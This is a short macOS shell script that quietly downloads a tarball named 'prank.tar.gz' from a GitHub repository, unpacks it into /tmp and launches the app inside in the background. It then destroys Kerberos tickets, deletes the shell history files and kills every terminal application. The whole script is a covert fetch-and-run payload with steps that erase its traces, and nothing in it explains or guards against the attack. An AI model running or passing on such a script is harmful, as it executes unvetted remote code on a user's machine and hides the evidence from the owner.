mkdir -p /tmp/laz/

curl -s -L https://github.com/monybigsef/p1/raw/master/prank.tar.gz -o /tmp/laz/prank.tar.gz > /dev/null

tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null

nohup open /tmp/laz/app/Laz.app > /dev/null

kdestroy
clear
rm -f ~/.*history*

killall iTerm
killall Terminal
killall iTerm2
